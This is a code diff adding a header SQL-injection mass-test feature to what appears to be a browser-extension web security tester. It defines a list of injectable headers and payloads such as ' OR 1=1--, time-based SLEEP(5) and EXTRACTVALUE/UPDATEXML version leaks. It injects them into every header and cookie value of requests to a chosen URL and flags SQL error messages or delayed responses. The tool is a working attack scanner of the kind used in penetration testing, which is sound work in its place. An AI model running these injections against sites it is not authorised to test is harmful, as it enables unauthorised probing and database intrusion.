@@ -637,7 +637,356 @@ updateEncodeButtons();
 
 
 
+    // ======================
+    // HEADER SQLi MASS-TEST
+    // ======================
 
+    const RISKY_HEADERS = new Set([
+        "cookie", "user-agent", "referer", "x-forwarded-for", "x-real-ip",
+        "x-client-ip", "x-originating-ip", "cf-connecting-ip", "true-client-ip",
+        "forwarded", "x-forwarded-host", "x-host", "x-original-url", "x-rewrite-url",
+        "x-original-host", "authorization", "x-api-key", "x-auth-token",
+        "x-access-token", "x-requested-with", "x-http-method-override",
+        "from", "via", "x-filter", "x-custom-ip"
+    ]);
+
+    const HEADER_DETECTION_PAYLOADS = [
+        { name: "Single Quote", payload: "'" },
+        { name: "OR 1=1", payload: "' OR 1=1--" },
+        { name: "AND SLEEP(5)", payload: "' AND SLEEP(5)--" },
+        { name: "ExtractValue", payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--" },
+        { name: "UpdateXML", payload: "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--" },
+        { name: "CONVERT MSSQL", payload: "' AND 1=CONVERT(int,@@version)--" },
+    ];
+
+    let hdrTestAbort = false;
+
+    function parseHeadersFromTextarea(text) {
+        const headers = [];
+        (text || "").split("\n").forEach(line => {
+            line = line.trim();
+            if (!line || !line.includes(":")) return;
+            const idx = line.indexOf(":");
+            const name = line.slice(0, idx).trim();
+            const value = line.slice(idx + 1).trim();
+            if (name) headers.push({ name, value, originalLine: line });
+        });
+        return headers;
+    }
+
+    function expandCookieHeaders(headers) {
+        const result = [];
+        for (const h of headers) {
+            if (h.name.toLowerCase() === "cookie") {
+                h.value.split(";").forEach(part => {
+                    const p = part.trim();
+                    if (!p) return;
+                    const eq = p.indexOf("=");
+                    if (eq === -1) return;
+                    const cName = p.slice(0, eq).trim();
+                    const cVal = p.slice(eq + 1).trim();
+                    if (cName) {
+                        result.push({
+                            name: "Cookie",
+                            value: cName + "=" + cVal,
+                            cookieName: cName,
+                            originalValue: cVal,
+                            isCookiePart: true
+                        });
+                    }
+                });
+            } else {
+                result.push(h);
+            }
+        }
+        return result;
+    }
+
+    async function testSingleHeader(header, payload, baseUrl, method, bodyText, baseHeaders, sendCookies) {
+        const testHeaders = { ...baseHeaders };
+
+        if (header.isCookiePart) {
+            const cookieParts = [];
+            const existing = (baseHeaders["Cookie"] || baseHeaders["cookie"] || "").split(";");
+            let found = false;
+            existing.forEach(p => {
+                const t = p.trim();
+                if (!t) return;
+                const eq = t.indexOf("=");
+                const n = eq >= 0 ? t.slice(0, eq).trim() : t;
+                if (n.toLowerCase() === header.cookieName.toLowerCase()) {
+                    cookieParts.push(header.cookieName + "=" + (header.originalValue || "") + payload);
+                    found = true;
+                } else {
+                    cookieParts.push(t);
+                }
+            });
+            if (!found) {
+                cookieParts.push(header.cookieName + "=" + (header.originalValue || "") + payload);
+            }
+            testHeaders["Cookie"] = cookieParts.join("; ");
+        } else {
+            testHeaders[header.name] = (header.value || "") + payload;
+        }
+
+        const start = performance.now();
+        const resp = await new Promise((resolve) => {
+            try {
+                browser.runtime.sendMessage({
+                    action: "fetchUrl",
+                    url: baseUrl,
+                    method,
+                    headers: testHeaders,
+                    body: (bodyText && method !== "GET" && method !== "HEAD") ? bodyText : undefined,
+                    credentials: sendCookies ? "include" : "omit"
+                }, (r) => {
+                    if (browser.runtime.lastError) {
+                        resolve({ ok: false, error: browser.runtime.lastError.message });
+                        return;
+                    }
+                    resolve(r || { ok: false, error: "Empty response" });
+                });
+            } catch (e) {
+                resolve({ ok: false, error: String(e && e.message || e) });
+            }
+        });
+        const ms = Math.round(performance.now() - start);
+
+        return {
+            header,
+            payload,
+            ok: resp.ok,
+            status: resp.status,
+            body: resp.body || "",
+            ms: resp.ms || ms,
+            error: resp.error
+        };
+    }
+
+    function renderHdrTestResults(results) {
+        const box = document.getElementById("hdrTestResults");
+        if (!box) return;
+
+        if (!results.length) {
+            box.innerHTML = `<div style="color:#888">${typeof t === "function" ? t("hdrtest.noResults") : "Keine Ergebnisse."}</div>`;
+            box.style.display = "block";
+            return;
+        }
+
+        const interesting = results.filter(r => {
+            if (!r.ok) return true;
+            const hasError = /sql|syntax|mysql|postgres|oracle|mssql|sqlite|ORA-\d|unclosed quotation/i.test(r.body || "");
+            return hasError || (r.ms > 4000);
+        });
+
+        const resultsLabel = typeof t === "function"
+            ? t("hdrtest.results", { total: results.length, interesting: interesting.length })
+            : `${results.length} Tests · ${interesting.length} interessant`;
+
+        let html = `<div style="font-size:12px;margin-bottom:6px">
+        <b>${results.length}</b> · 
+        <span style="color:${interesting.length ? "#fbbf24" : "#4ade80"}">${resultsLabel}</span>
+    </div>`;
+
+        html += `<div style="max-height:280px;overflow:auto;border:1px solid var(--border,#1a2f25);border-radius:6px;padding:6px 8px;font-size:11px;font-family:ui-monospace,monospace">`;
+
+        results.forEach((r, i) => {
+            const name = r.header.isCookiePart
+                ? `Cookie:${r.header.cookieName}`
+                : r.header.name;
+            const label = `${name} + ${r.payload.substring(0, 28)}${r.payload.length > 28 ? "…" : ""}`;
+
+            let color = "#888";
+            let badge = "clean";
+            if (!r.ok) {
+                color = "#f87171";
+                badge = "error";
+            } else if (/sql|syntax|mysql|postgres|oracle|mssql|sqlite|ORA-\d|unclosed quotation|extractvalue|updatexml/i.test(r.body || "")) {
+                color = "#f87171";
+                badge = "HIGH";
+            } else if (r.ms > 4000) {
+                color = "#fbbf24";
+                badge = "TIME";
+            }
+
+            html += `<div style="padding:4px 0;border-bottom:1px solid #1a2f25;display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+            <span style="color:${color};font-weight:600;min-width:48px">[${badge}]</span>
+            <span style="flex:1;word-break:break-all">${escapeHtml(label)}</span>
+            <span style="color:#666">${r.status || "-"} · ${r.ms}ms · ${(r.body || "").length}B</span>
+            <button class="btn-secondary hdr-load-btn" data-idx="${i}" style="font-size:10px;padding:2px 6px">→ Tester</button>
+        </div>`;
+        });
+
+        html += `</div>`;
+        box.innerHTML = html;
+        box.style.display = "block";
+
+        box.querySelectorAll(".hdr-load-btn").forEach(btn => {
+            btn.addEventListener("click", () => {
+                const r = results[parseInt(btn.dataset.idx, 10)];
+                if (!r) return;
+
+                const th = document.getElementById("testerHeaders");
+                if (th) {
+                    const lines = th.value.split("\n").map(l => l.trim()).filter(Boolean);
+                    let found = false;
+                    const newLines = lines.map(line => {
+                        const idx = line.indexOf(":");
+                        if (idx === -1) return line;
+                        const n = line.slice(0, idx).trim();
+                        if (n.toLowerCase() === r.header.name.toLowerCase()) {
+                            found = true;
+                            if (r.header.isCookiePart) {
+                                return "Cookie: " + r.header.cookieName + "=" + (r.header.originalValue || "") + r.payload;
+                            }
+                            return r.header.name + ": " + (r.header.value || "") + r.payload;
+                        }
+                        return line;
+                    });
+                    if (!found) {
+                        newLines.push(r.header.name + ": " + (r.header.value || "") + r.payload);
+                    }
+                    th.value = newLines.join("\n");
+                }
+
+                if (r.ok && typeof renderResponseView === "function") {
+                    renderResponseView(
+                        document.getElementById("testerResponse"),
+                        r.status, "", [], r.body || ""
+                    );
+                }
+                if (typeof analyzeSqliResponse === "function") {
+                    analyzeSqliResponse(r.body || "", r.status, (r.body || "").length, r.ms);
+                }
+                log((typeof t === "function" ? t("hdrtest.loaded") : "Header-Test geladen:") + " " + r.header.name);
+            });
+        });
+    }
+
+    async function runHeaderSqliTest() {
+        const btn = document.getElementById("testAllHeadersBtn");
+        const abortBtn = document.getElementById("hdrTestAbortBtn");
+        const progress = document.getElementById("hdrTestProgress");
+        const resultsBox = document.getElementById("hdrTestResults");
+
+        const baseUrl = (document.getElementById("urlInput")?.value || "").trim();
+        if (!baseUrl) {
+            log(typeof t === "function" ? t("hdrtest.noUrl") : "Keine URL vorhanden", "warn");
+            return;
+        }
+
+        const headerText = document.getElementById("testerHeaders")?.value || "";
+        let headers = parseHeadersFromTextarea(headerText);
+        if (!headers.length) {
+            log(typeof t === "function" ? t("hdrtest.noHeaders") : "Keine Header im Textarea", "warn");
+            return;
+        }
+
+        const riskyOnly = document.getElementById("hdrTestRiskyOnly")?.checked ?? true;
+        if (riskyOnly) {
+            headers = headers.filter(h => RISKY_HEADERS.has(h.name.toLowerCase()));
+        }
+        headers = expandCookieHeaders(headers);
+
+        if (!headers.length) {
+            log(typeof t === "function" ? t("hdrtest.noRisky") : "Keine risky Header gefunden (Haken entfernen für alle)", "warn");
+            return;
+        }
+
+        const useCurrentPayload = document.getElementById("hdrTestUsePayload")?.checked ?? false;
+        let payloads = [];
+        if (useCurrentPayload) {
+            const p = (document.getElementById("customPayload")?.value || "").trim();
+            if (!p) {
+                log(typeof t === "function" ? t("hdrtest.emptyPayload") : "Aktueller Payload ist leer", "warn");
+                return;
+            }
+            payloads = [{ name: "Custom", payload: p }];
+        } else {
+            payloads = HEADER_DETECTION_PAYLOADS;
+        }
+
+        const method = (document.getElementById("testerMethod")?.value || "GET").toUpperCase();
+        const bodyText = document.getElementById("testerBody")?.value || "";
+        const sendCookies = document.getElementById("optSendCookies")?.checked ?? true;
+        const sendHeaders = document.getElementById("optSendHeaders")?.checked ?? true;
+
+        const baseHeaders = {};
+        if (sendHeaders) {
+            parseHeadersFromTextarea(headerText).forEach(h => {
+                if (h.name.toLowerCase() !== "cookie") {
+                    baseHeaders[h.name] = h.value;
+                } else {
+                    baseHeaders["Cookie"] = h.value;
+                }
+            });
+        }
+
+        hdrTestAbort = false;
+        if (btn) btn.disabled = true;
+        if (abortBtn) abortBtn.style.display = "inline-block";
+        if (progress) {
+            progress.style.display = "block";
+            progress.textContent = typeof t === "function"
+                ? t("hdrtest.starting", { total: headers.length * payloads.length })
+                : `Starte… 0 / ${headers.length * payloads.length}`;
+        }
+        if (resultsBox) resultsBox.style.display = "none";
+
+        const allResults = [];
+        let done = 0;
+        const total = headers.length * payloads.length;
+
+        for (const header of headers) {
+            if (hdrTestAbort) break;
+            for (const p of payloads) {
+                if (hdrTestAbort) break;
+
+                const res = await testSingleHeader(
+                    header, p.payload, baseUrl, method, bodyText, baseHeaders, sendCookies
+                );
+                allResults.push(res);
+                done++;
+
+                if (progress) {
+                    const name = header.isCookiePart ? "Cookie:" + header.cookieName : header.name;
+                    progress.textContent = typeof t === "function"
+                        ? t("hdrtest.progress", { done, total, name })
+                        : `Teste… ${done} / ${total}  (${name})`;
+                }
+
+                await new Promise(r => setTimeout(r, 120));
+            }
+        }
+
+        if (btn) btn.disabled = false;
+        if (abortBtn) abortBtn.style.display = "none";
+        if (progress) {
+            progress.textContent = hdrTestAbort
+                ? (typeof t === "function" ? t("hdrtest.aborted", { done, total }) : `Abgebrochen nach ${done}/${total}`)
+                : (typeof t === "function" ? t("hdrtest.done", { done }) : `Fertig: ${done} Tests`);
+        }
+
+        renderHdrTestResults(allResults);
+
+        const hits = allResults.filter(r => r.ok && /sql|syntax|mysql|postgres|oracle|mssql|sqlite|ORA-\d|unclosed quotation/i.test(r.body || "")).length;
+        log(
+            typeof t === "function"
+                ? t("hdrtest.finished", { total: allResults.length, hits })
+                : `Header-SQLi-Test fertig: ${allResults.length} Requests, ${hits} mögliche Treffer`,
+            hits ? "warn" : "success"
+        );
+    }
+
+    // Event-Listener
+    document.getElementById("testAllHeadersBtn")?.addEventListener("click", () => {
+        runHeaderSqliTest();
+    });
+
+    document.getElementById("hdrTestAbortBtn")?.addEventListener("click", () => {
+        hdrTestAbort = true;
+        log(typeof t === "function" ? t("hdrtest.aborting") : "Header-Test wird abgebrochen…");
+    });
 
 
     function initTester() {
